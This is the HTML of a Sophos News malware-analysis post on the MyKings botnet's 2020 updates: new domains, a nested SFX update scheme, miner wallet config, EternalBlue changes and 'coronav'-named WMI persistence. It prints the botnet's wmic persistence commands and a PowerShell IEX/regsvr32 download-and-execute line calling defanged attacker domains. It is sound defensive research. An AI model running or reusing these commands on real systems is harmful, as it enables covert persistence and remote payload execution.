<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta http-equiv="x-ua-compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="https://news.sophos.com/xmlrpc.php">
<link rel="alternate" hreflang="en-us" href="https://news.sophos.com/en-us/2020/07/02/mykings-jumps-on-the-corona-train/" /><!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl+ '&gtm_auth=d5XceCG5H_eblswmMfURjQ&gtm_preview=env-2&gtm_cookies_win=x';f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-5L6H3LN');</script>
<!-- End Google Tag Manager -->
<title>Mykings jumps on the Corona train &#8211; Sophos News</title>
<meta name='robots' content='max-image-preview:large' />
<!-- Jetpack Site Verification Tags -->
<meta name="google-site-verification" content="8r1qg681OjOolfxmHEY1IYupmTBdyKXc-OPfpgeQHFk" />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel='dns-prefetch' href='//v0.wordpress.com' />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; Feed" href="https://news.sophos.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; Comments Feed" href="https://news.sophos.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; Mykings jumps on the Corona train Comments Feed" href="https://news.sophos.com/en-us/2020/07/02/mykings-jumps-on-the-corona-train/feed/" />
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/news.sophos.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.7"}};
			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([55357,56424,8205,55356,57212],[55357,56424,8203,55356,57212])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel='stylesheet' id='all-css-0' href='https://news.sophos.com/_static/??/wp-includes/css/dist/block-library/style.min.css,/wp-content/themes/sophosnews-2017/style.css,/wp-content/mu-plugins/jetpack-9.5/css/jetpack.css?m=1616171106' type='text/css' media='all' />
<style id='wp-block-library-inline-css'>
.has-text-align-justify{text-align:justify;}
</style>
<script type='text/javascript' src='https://news.sophos.com/_static/??-eJzTLy/QzcxLzilNSS3WzwKiwtLUokoopZebmaeXVayjj0+Rbm5melFiSSpUsX2uraGZoamxkaGpqUUWAK9KIh0='></script>
<link rel="https://api.w.org/" href="https://news.sophos.com/wp-json/" /><link rel="alternate" type="application/json" href="https://news.sophos.com/wp-json/wp/v2/posts/67566" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://news.sophos.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://news.sophos.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.7" />
<link rel="canonical" href="https://news.sophos.com/en-us/2020/07/02/mykings-jumps-on-the-corona-train/" />
<link rel='shortlink' href='https://news.sophos.com/?p=67566' />
<link rel="alternate" type="application/json+oembed" href="https://news.sophos.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnews.sophos.com%2Fen-us%2F2020%2F07%2F02%2Fmykings-jumps-on-the-corona-train%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://news.sophos.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnews.sophos.com%2Fen-us%2F2020%2F07%2F02%2Fmykings-jumps-on-the-corona-train%2F&#038;format=xml" />
<style type='text/css'>img#wpstats{display:none}</style><link rel="amphtml" href="https://news.sophos.com/en-us/2020/07/02/mykings-jumps-on-the-corona-train/amp/">
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="Mykings jumps on the Corona train" />
<meta property="og:url" content="https://news.sophos.com/en-us/2020/07/02/mykings-jumps-on-the-corona-train/" />
<meta property="og:description" content="The ubiquitous, noisy, SQL-attacking botnet can&#8217;t help comparing itself to a deadly disease" />
<meta property="article:published_time" content="2020-07-02T13:00:37+00:00" />
<meta property="article:modified_time" content="2020-07-02T10:31:01+00:00" />
<meta property="og:site_name" content="Sophos News" />
<meta property="og:image" content="https://news.sophos.com/wp-content/uploads/2020/07/mykings_intro_art.png?w=640" />
<meta property="og:image:secure_url" content="https://news.sophos.com/wp-content/uploads/2020/07/mykings_intro_art.png?w=640" />
<meta property="og:image:width" content="640" />
<meta property="og:image:height" content="432" />
<meta property="og:locale" content="en_US" />
<meta name="twitter:text:title" content="Mykings jumps on the Corona train" />
<meta name="twitter:image" content="https://news.sophos.com/wp-content/uploads/2020/07/mykings_intro_art.png?w=640" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="fb:admins" content="28552295016" />

<!-- End Jetpack Open Graph Tags -->
<link rel="icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=32" sizes="32x32" />
<link rel="icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=192" sizes="192x192" />
<link rel="apple-touch-icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=180" />
<meta name="msapplication-TileImage" content="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=270" />
</head>

<body class="post-template-default single single-post postid-67566 single-format-standard group-blog">
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5L6H3LN&gtm_auth=d5XceCG5H_eblswmMfURjQ&gtm_preview=env-2&gtm_cookies_win=x"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->
<div id="page" class="hfeed site">
	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>

	<header id="masthead" class="site-header">

		<div class="header-container">

			<div class="site-branding">
				<h1 class="site-title">
										<a class="site-logo" href="https://www.sophos.com/en-us.aspx" rel="home">
						Sophos News					</a>
				</h1>
			</div> <!-- site-branding -->

			<nav class="primary-header-navigation" role="navigation">
				<ul id="menu-en-us-primary" class="menu"><li id="menu-item-33368" class="has-icons menu-item menu-item-type-custom menu-item-object-custom menu-item-33368"><a href="https://www.sophos.com/en-us/products.aspx">Products<div class="menu-item-description"></div></a></li>
<li id="menu-item-33382" class="has-icons menu-item menu-item-type-custom menu-item-object-custom menu-item-33382"><a href="https://www.sophos.com/en-us/solutions.aspx">Solutions<div class="menu-item-description"></div></a></li>
<li id="menu-item-33390" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33390"><a href="//www.sophos.com/en-us/partners.aspx">Partners<div class="menu-item-description"></div></a></li>
<li id="menu-item-33391" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33391"><a href="//www.sophos.com/en-us/support.aspx">Support<div class="menu-item-description"></div></a></li>
<li id="menu-item-33392" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33392"><a href="//www.sophos.com/en-us/company.aspx">Company<div class="menu-item-description"></div></a></li>
<li id="menu-item-33393" class="is-icon icon-download menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-33393"><a href="#">Downloads<div class="menu-item-description"></div></a>
<ul class="sub-menu">
	<li id="menu-item-33394" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33394"><a href="//www.sophos.com/en-us/products/free-trials.aspx">Free Trials<div class="menu-item-description">All product trials in one place.</div></a></li>
	<li id="menu-item-33395" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33395"><a href="//www.sophos.com/en-us/products/free-tools.aspx">Free Tools<div class="menu-item-description">Try our tools for use at home.</div></a></li>
	<li id="menu-item-33396" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33396"><a href="//www.sophos.com/en-us/products/request-a-quote.aspx">Get Pricing<div class="menu-item-description">The right price every time.</div></a></li>
</ul>
</li>
<li id="menu-item-33397" class="is-icon icon-search menu-item menu-item-type-custom menu-item-object-custom menu-item-33397"><a href="//www.sophos.com/en-us/search-results.aspx">Search<div class="menu-item-description"></div></a></li>
<li id="menu-item-33398" class="is-icon icon-account menu-item menu-item-type-custom menu-item-object-custom menu-item-33398"><a href="//www.sophos.com/en-us/login.aspx">Sign In<div class="menu-item-description"></div></a></li>
</ul>			</nav>

		</div>
	</header> <!-- site-header -->

	<div class="secondary-header">
		<div class="secondary-header-container container">
			<nav class="secondary-header-navigation" role="navigation">
				<ul id="menu-en-us-secondary" class="menu"><li id="menu-item-33399" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33399"><a href="//www.sophos.com/en-us/company.aspx">Overview</a></li>
<li id="menu-item-33401" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33401"><a href="//www.sophos.com/en-us/company/press.aspx">Press</a></li>
<li id="menu-item-33402" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33402"><a href="//secure2.sophos.com/en-us/company/events.aspx">Events</a></li>
<li id="menu-item-33403" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33403"><a href="//www.sophos.com/en-us/company/community.aspx">Community</a></li>
<li id="menu-item-33404" class="menu-item-blog menu-item menu-item-type-custom menu-item-object-custom menu-item-33404"><a href="/">Blog</a></li>
<li id="menu-item-33405" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33405"><a href="//secure2.sophos.com/en-us/company/careers.aspx">Careers</a></li>
<li id="menu-item-33406" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33406"><a href="//www.sophos.com/en-us/company/contact.aspx">Contact</a></li>
</ul>			</nav>
		</div>
	</div> <!-- secondary-header -->

	<div class="news-header">
		<div class="news-header-container container">

			<div class="news-branding">
				<h1 class="news-title">
					<a class="news-logo" href="https://news.sophos.com/en-us/" rel="home">
						Sophos News					</a>
				</h1>
			</div> <!-- news-branding -->

			<div class="mobile-menu-toggle">
				<a href="#newsmenu">
											Menu									</a>
			</div>

			<div class="mobile-search-toggle">
				<a class="icon icon-search-secondary" href="#search">
					Search				</a>
			</div>

			<nav class="news-header-navigation" role="navigation">
				<ul id="menu-en-us-tertiary" class="menu"><li id="menu-item-33407" class="is-icon icon-search menu-item menu-item-type-custom menu-item-object-custom menu-item-33407"><a href="#search">Search</a></li>
</ul>			</nav>

			<div class="site-search-block" style="display: none;">
				<form role="search" class="search-form" method="get" action="https://news.sophos.com/en-us/">
					<fieldset>
						<div class="field">
							<input type="text" value="" name="s" class="search-field" placeholder="Search">
						</div>
						<div class="submit">
							<button type="submit" class="search-submit icon icon-search-secondary">
								Go							</button>
						</div>
					</fieldset>
				</form>
				<a class="icon" href="#search-close">
					Close				</a>
			</div>
		</div>
	</div> <!-- news-header -->

	<div id="content" class="site-content">
		<div class="content-container">

	<div id="primary" class="content-area">
		<main id="main" class="site-main" role="main">

		
			
<article id="post-67566" class="post-67566 post type-post status-publish format-standard has-post-thumbnail hentry category-sophoslabs-uncut tag-botnet tag-coronav tag-coronav2 tag-cryptominer tag-eternalblue tag-mykings region-en-us">

	<header class="entry-header">

		<h1 class="entry-title">Mykings jumps on the Corona train</h1>
		<div class="entry-categories">
			<a href="https://news.sophos.com/en-us/category/sophoslabs/sophoslabs-uncut/">SophosLabs Uncut</a>&bull;<a href="https://news.sophos.com/en-us/tag/botnet/">Botnet</a>&bull;<a href="https://news.sophos.com/en-us/tag/coronav/">coronav</a>&bull;<a href="https://news.sophos.com/en-us/tag/coronav2/">coronav2</a>&bull;<a href="https://news.sophos.com/en-us/tag/cryptominer/">cryptominer</a>&bull;<a href="https://news.sophos.com/en-us/tag/eternalblue/">EternalBlue</a>&bull;<a href="https://news.sophos.com/en-us/tag/mykings/">MyKings</a>		</div>

					<div class="entry-excerpt">
				<p>The ubiquitous, noisy, SQL-attacking botnet can&#8217;t help comparing itself to a deadly disease</p>
			</div>
		
		<div class="entry-meta">
			<span class="posted-on"><a href="https://news.sophos.com/en-us/2020/07/02/mykings-jumps-on-the-corona-train/" rel="bookmark">2 July 2020</a></span>		</div><!-- .entry-meta -->

		<div class="entry-social">
			
	<ul class="social-sharing" id="social-sharing">
		<li class="comments">
			<a href="#comments" title="Leave a Reply">
				0			</a>
		</li>
		<li class="twitter"><a class="js-share-modal" href="http://twitter.com/intent/tweet?text=Mykings%20jumps%20on%20the%20Corona%20train%20https%3A%2F%2Fnews.sophos.com%2F%3Fp%3D67566" data-title="" title="Share on Twitter">Share on Twitter</a></li>
		<li class="facebook"><a class="js-share-modal" href="http://www.facebook.com/share.php?u=https://news.sophos.com/?p=67566&#038;title=Mykings%20jumps%20on%20the%20Corona%20train" data-title="Mykings jumps on the Corona train" title="Share on Facebook">Share on Facebook</a></li>
		<li class="linkedin">
			<a
				href="http://www.linkedin.com/shareArticle?mini=true&url=https://news.sophos.com/en-us/2020/07/02/mykings-jumps-on-the-corona-train/"
				data-title="Mykings jumps on the Corona train"
				title="Share on LinkedIn"
				onclick="window.open(this.href, '', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
			>
				Share on LinkedIn			</a>
		</li>
	</ul>

			</div><!-- .entry-social -->
	</header><!-- .entry-header -->

		<div class="entry-featured-image">
		<img width="640" height="432" src="https://news.sophos.com/wp-content/uploads/2020/07/mykings_intro_art.png?w=640" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" loading="lazy" srcset="https://news.sophos.com/wp-content/uploads/2020/07/mykings_intro_art.png 768w, https://news.sophos.com/wp-content/uploads/2020/07/mykings_intro_art.png?resize=300,202 300w" sizes="(max-width: 640px) 100vw, 640px" />	</div> <!-- .featured-image -->
	
	<div class="entry-meta">
		<span class="byline">By <span class="author vcard"><a href="https://news.sophos.com/en-us/author/gabor-szappanos/" title="Posts by Gabor Szappanos" class="author url fn" rel="author">Gabor Szappanos</a></span></span>	</div><!-- .entry-meta -->

	<div class="entry-content">
		<p>A lot of cybercriminal groups adopt themes drawn from current events to attract victims, and there&#8217;s no bigger global news story right now than the ongoing fight against the novel coronavirus or the disease it causes, COVID-19. While most attackers who reference ripped-from-the-headlines topics tend to use those lures in malicious emails or text messages, the operators of the MyKings botnet doesn&#8217;t use those types of methods to spread infections &#8212; they prefer cracking SQL servers or using the EternalBlue exploit to infect computers.</p>
<p>Mykings have taken a slightly different approach: They added references to our global pandemic into the source code of their malware, itself.</p>
<p>But that’s not the only news about this group, which we&#8217;ve covered in previous SophosLabs uncut posts. The botnet&#8217;s operators made significant changes to their infrastructure, moving almost all of the domains they use to distribute the malware (including a few new ones) so it is hosted on a single IP address. They&#8217;ve also enhanced the update mechanism with a twist, rolling into production a previously-developed but unused feature to update the C2 servers used by the bootkit components.</p>
<h2>New domains</h2>
<p>We noticed a new ftp drop site used by the botnet, residing on the IP address<strong> 185.26.112.217</strong>. As it turned out this server is also used to distribute some of the updated components:</p>
<p><img loading="lazy" class="alignnone wp-image-67558" src="https://news.sophos.com/wp-content/uploads/2020/06/20200701_mykings_image1.png" alt="" width="470" height="329" srcset="https://news.sophos.com/wp-content/uploads/2020/06/20200701_mykings_image1.png 812w, https://news.sophos.com/wp-content/uploads/2020/06/20200701_mykings_image1.png?resize=300,210 300w, https://news.sophos.com/wp-content/uploads/2020/06/20200701_mykings_image1.png?resize=768,537 768w" sizes="(max-width: 470px) 100vw, 470px" /></p>
<p>The 400kB files are WinRAR SFX droppers for the c3.bat installer; the 40kB files are NSIS Dloadr packages, <a href="https://www.sophos.com/en-us/medialibrary/PDFs/technical-papers/sophoslabs-uncut-mykings-report.pdf" target="_blank" rel="noopener noreferrer">both detailed in our previously-released MyKings report</a>.</p>
<p>Beyond the file repository, Virustotal passive DNS info revealed that <a href="https://github.com/sophoslabs/IoCs/blob/master/malware-MyKings-domains" target="_blank" rel="noopener noreferrer">many of the historically used distribution domains</a> (and some we didn&#8217;t previously know about) were also migrated to this new host.</p>
<h2>Revitalized update mechanism</h2>
<p>One of the major components of the botnet is the WinRAR SFX (self extracting executable) that drops the main installer script, c3.bat. The latest updates to the botnet added a twist to this scheme, with an additional layer of packaging.</p>
<p>This component now is a WinRAR SFX dropper that drops another WinRAR SFX package. The top level dropper updates the bootkit configuration, while the internal layer contains config update for the cryptominer component.</p>
<p>These files make up the contents of the top level archive:</p>
<p><img loading="lazy" class="alignnone size-full wp-image-67559" src="https://news.sophos.com/wp-content/uploads/2020/06/20200701_mykings_image2.png" alt="" width="640" height="111" srcset="https://news.sophos.com/wp-content/uploads/2020/06/20200701_mykings_image2.png 1390w, https://news.sophos.com/wp-content/uploads/2020/06/20200701_mykings_image2.png?resize=300,52 300w, https://news.sophos.com/wp-content/uploads/2020/06/20200701_mykings_image2.png?resize=768,134 768w, https://news.sophos.com/wp-content/uploads/2020/06/20200701_mykings_image2.png?resize=1024,178 1024w" sizes="(max-width: 640px) 100vw, 640px" /></p>
<pre>d5e25a7fbeb1b710accd7056c3439f0743288792  ntuser.dat
7eba46568f20987d644d334bea1fd40fd4d68ccb  upx.exe</pre>
<p>The <strong>ntuser.dat</strong> file contains an encrypted configuration, and the shellcode, used by the bootkit component. It expects itself to be in the Windows\Temp directory, which is exactly where the installer unpacks it.</p>
<p>The config file is encoded with a single-byte XOR. In its encrypted form, it looks like this:</p>
<figure id="attachment_67560" aria-describedby="caption-attachment-67560" style="width: 466px" class="wp-caption alignnone"><img loading="lazy" class="wp-image-67560" src="https://news.sophos.com/wp-content/uploads/2020/06/20200701_mykings_image3.png" alt="" width="466" height="171" srcset="https://news.sophos.com/wp-content/uploads/2020/06/20200701_mykings_image3.png 866w, https://news.sophos.com/wp-content/uploads/2020/06/20200701_mykings_image3.png?resize=300,110 300w, https://news.sophos.com/wp-content/uploads/2020/06/20200701_mykings_image3.png?resize=768,282 768w" sizes="(max-width: 466px) 100vw, 466px" /><figcaption id="caption-attachment-67560" class="wp-caption-text">Config file content encoded with a one-byte XOR (the key is 0x95).</figcaption></figure>
<p>The decryped content reveals the updated download server list:</p>
<pre>[main]
count=6
ip1=http://gamesoxalic.com
ip2=http://catsmeowalot.com
ip3=http://b5w91.com
[update]
count=6
ip1=http://gamesoxalic.com
ip2=http://catsmeowalot.com
ip3=http://b5w91.com</pre>
<p>The second file in the package, named upx.exe, is a WinRAR SFX dropper that contains c3.bat, the main installer component of the botnet.</p>
<p>This archive contains the following:</p>
<p><img loading="lazy" class="alignnone size-full wp-image-67561" src="https://news.sophos.com/wp-content/uploads/2020/06/20200701_mykings_image4.png" alt="" width="640" height="124" srcset="https://news.sophos.com/wp-content/uploads/2020/06/20200701_mykings_image4.png 1194w, https://news.sophos.com/wp-content/uploads/2020/06/20200701_mykings_image4.png?resize=300,58 300w, https://news.sophos.com/wp-content/uploads/2020/06/20200701_mykings_image4.png?resize=768,149 768w, https://news.sophos.com/wp-content/uploads/2020/06/20200701_mykings_image4.png?resize=1024,199 1024w" sizes="(max-width: 640px) 100vw, 640px" /></p>
<p>The c3.bat and n.vbs files serve the same purpose as the files by the same name we analyzed previously: n.vbs starts c3.bat which is the main installer component of the botnet.</p>
<p>There is an additional file to the usual content, named excludes, which contains the configuration data for the XMRig cryptocurrency miner, including the following wallet info:</p>
<pre>"url": "xmr-eu1.nanopool.org:14433",
"user": "4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQtLomg2VJLC55d2Npc.x",
"url": "xmr-eu1.nanopool.org:14444",
"user": "4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQtLomg2VJLC55d2Npc.x2",</pre>
<p>This mechanism relies on the fact that some versions of the XMRig miner used by the Mykings botnet search for this &#8220;excludes&#8221; file in the %TEMP% directory (exactly where the WinRAR SFX extracts it to), and if found, uses this file as the config data.</p>
<p><img loading="lazy" class="alignnone wp-image-67562" src="https://news.sophos.com/wp-content/uploads/2020/06/20200701_mykings_image5.png" alt="" width="414" height="361" srcset="https://news.sophos.com/wp-content/uploads/2020/06/20200701_mykings_image5.png 564w, https://news.sophos.com/wp-content/uploads/2020/06/20200701_mykings_image5.png?resize=300,262 300w" sizes="(max-width: 414px) 100vw, 414px" /></p>
<p>The botnet operators try to establish a mechanism to easily update the wallet info, without replacing the miner executable itself.</p>
<h2>EternalBlue revisited</h2>
<p>Slight changes were made to the EternalBlue module that MyKings uses. During exploitation, the bot executes a payload script (ms17010_cmd). This usually is a downloader script, which was significantly simplified.</p>
<p><img loading="lazy" class="alignnone size-full wp-image-67563" src="https://news.sophos.com/wp-content/uploads/2020/06/20200701_mykings_image6.png" alt="" width="640" height="160" srcset="https://news.sophos.com/wp-content/uploads/2020/06/20200701_mykings_image6.png 1882w, https://news.sophos.com/wp-content/uploads/2020/06/20200701_mykings_image6.png?resize=300,75 300w, https://news.sophos.com/wp-content/uploads/2020/06/20200701_mykings_image6.png?resize=768,192 768w, https://news.sophos.com/wp-content/uploads/2020/06/20200701_mykings_image6.png?resize=1024,256 1024w, https://news.sophos.com/wp-content/uploads/2020/06/20200701_mykings_image6.png?resize=1536,384 1536w" sizes="(max-width: 640px) 100vw, 640px" /></p>
<p>Another notable change is that, instead of hosting it on their own servers (of which they had a lot), the botnet operators now use a script hosted on the website <strong>img.vim-cn.com</strong>, a little-known, anonymous image hosting service. Needless to say, the criminals were not storing an image file there. Rather, they hosted the downloader component for the botnet that pulls down the next stages.</p>
<p><img loading="lazy" class="alignnone size-full wp-image-67564" src="https://news.sophos.com/wp-content/uploads/2020/06/20200701_mykings_image7.png" alt="" width="640" height="152" srcset="https://news.sophos.com/wp-content/uploads/2020/06/20200701_mykings_image7.png 1866w, https://news.sophos.com/wp-content/uploads/2020/06/20200701_mykings_image7.png?resize=300,71 300w, https://news.sophos.com/wp-content/uploads/2020/06/20200701_mykings_image7.png?resize=768,183 768w, https://news.sophos.com/wp-content/uploads/2020/06/20200701_mykings_image7.png?resize=1024,244 1024w, https://news.sophos.com/wp-content/uploads/2020/06/20200701_mykings_image7.png?resize=1536,365 1536w" sizes="(max-width: 640px) 100vw, 640px" /></p>
<h2>The Coronavirus connection</h2>
<p>A closer look at the latest c3.bat file revealed that it uses references to the Corona virus in the WMI event handler names:</p>
<pre>wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="<strong>coronav</strong>", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 10800 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"

wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="<strong>coronav2</strong>", CommandLineTemplate="cmd /c powershell.exe IEX (New-Object system.Net.WebClient).DownloadString
…
cmd /c start wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"<strong>coronav</strong>\"", Consumer="CommandLineEventConsumer.Name=\"<strong>coronav2</strong>\""</pre>
<p>This reference to the virus is not normally visible on infected systems and has no effect in increasing the efficiency of the botnet.</p>
<p>On an infected system the created filter binding can be observed:</p>
<pre>Consumer="CommandLineEventConsumer.Name="coronav2""
CreatorSID={1,5,0,0,0,0,0,5,21,0,0,0,96,114,232,122,207,62,119,185,146,182,239,211,233,3,0,0}
DeliverSynchronously=FALSE
DeliveryQoS=
Filter="__EventFilter.Name="coronav""
MaintainSecurityContext=FALSE
SlowDownProviders=FALSE</pre>
<p>And the event consumer code contains the familiar PowerShell downloader, using the SquiblyDoo technique, with the new download domain names (obfuscated here to prevent accidental clicks):</p>
<pre>CommandLineTemplate=cmd /c powershell.exe IEX (New-Object system.Net.WebClient).DownloadString('hxxp://ruisgood[.]ru/power.txt')||powershell.exe IEX (New-Object system.Net.WebClient).DownloadString('hxxp://gamesoxalic[.]com/power.txt')||regsvr32 /u /s /i:hxxp://ruisgood[.]ru/s.txt scrobj.dll&amp;amp;regsvr32 /u /s /i:hxxp://gamesoxalic[.]com/s.txt scrobj.dll&amp;amp;wmic os get /FORMAT:"hxxp://ruisgood[.]ru/s.xsl"</pre>
<h2>Infection stats</h2>
<p>The number of unique bots infected by Mykings at a given time is around 40000, which is about the same number that we observed in the autumn of 2019. Overall, the total number of infected systems this year is over 175,000, and it showed a growing trend, then a yet-unexplained drop in May.</p>
<p>The targeted countries show a huge change from last year. Last fall, China and Taiwan were the most infected countries. Now the major targets became overwhelmingly countries form the former Soviet Union, with Russia, Ukraine, Kazakhstan, Armenia in the top ten.</p>
<p><img loading="lazy" class="alignnone wp-image-67592 " src="https://news.sophos.com/wp-content/uploads/2020/07/20200701_mykings_image8_m.png" alt="" width="708" height="369" srcset="https://news.sophos.com/wp-content/uploads/2020/07/20200701_mykings_image8_m.png 1512w, https://news.sophos.com/wp-content/uploads/2020/07/20200701_mykings_image8_m.png?resize=300,156 300w, https://news.sophos.com/wp-content/uploads/2020/07/20200701_mykings_image8_m.png?resize=768,400 768w, https://news.sophos.com/wp-content/uploads/2020/07/20200701_mykings_image8_m.png?resize=1024,534 1024w" sizes="(max-width: 708px) 100vw, 708px" /></p>
<p>Looking at the history of infection, we observe that there were hardly any infected bots reported form China in the months of January and February, then the Chinese infection numbers started to increase in March, and by May the country regained its original position in the top three infected countries. We have no explanation for this significant regional drop.</p>
<h2>Detections</h2>
<p>The MyKings botnet components may be detected by Sophos endpoint security products as Troj/Agent-BAKV, Troj/Agent-BAWU, Troj/DwnLdr-XOD, Troj/DwnLdr-XHH, Troj/Miner-WR, Mal/Miner-C, VBS/Dwnldr-MDQ, or XMRig Miner (PUA).</p>
<p>Updated indicators of compromise can be <a href="https://github.com/sophoslabs/IoCs/blob/master/malware-MyKings-v2" target="_blank" rel="noopener noreferrer">found on the SophosLabs Github</a>.</p>
			</div><!-- .entry-content -->

</article><!-- #post-## -->

					<nav class="navigation post-navigation" role="navigation">
			<h2 class="screen-reader-text">Post navigation</h2>
			<div class="nav-links">
	   			<div class="nav-previous">
											<span class="nav-label">Prev</span>
						<a href="https://news.sophos.com/en-us/2020/06/30/intercept-x-with-edr-is-a-two-for-one-win-for-xg-firewall-users/" rel="prev">Intercept X with EDR is a two-for-one win for XG Firewall users</a>
						   			</div>
	   			<div class="nav-next">
											<span class="nav-label">Next</span>
						<a href="https://news.sophos.com/en-us/2020/07/06/remote-learning-top-5-cybersecurity-risks-for-education/" rel="next">Remote learning: Top five cybersecurity risks for education</a>
						   			</div>
		 	</div><!-- .nav-links -->
		</nav><!-- .navigation -->
		
			<div class="article-author-block article-co-authors-block">
	
					<h2 class="author-title">
				About the Author			</h2>
		
					<div class="author-block-container">
				<div class="author-profile">
					<img alt='' src='https://secure.gravatar.com/avatar/040a829707237b26ea3984dfc4621217?s=145&#038;d=blank&#038;r=g' class='avatar avatar-145 photo' height='145' width='145' />				</div> <!-- .author-profile -->

				<div class="author-description">
					<h3 class="author-name"><a href="https://news.sophos.com/en-us/author/gabor-szappanos/" title="Posts by Gabor Szappanos" class="author url fn" rel="author">Gabor Szappanos</a></h3>

					
					<div class="author-bio">
						<p>Gabor graduated from the Eotvos Lorand University of Budapest with a degree in physics. His first job was in the Computer and Automation Research Institute, developing diagnostic software and hardware for nuclear power plants. He started antivirus work in 1995, and began developing freeware antivirus solutions in his spare time. Gabor joined VirusBuster in 2001 where he was responsible for taking care of macro virus and script malware and became head of the virus lab in 2002. In 2008 he became a member of the Board of Directors in AMTSO (Anti Malware Testing Standards Organization) and, in 2012, joined Sophos as a Principal Malware Researcher.</p>
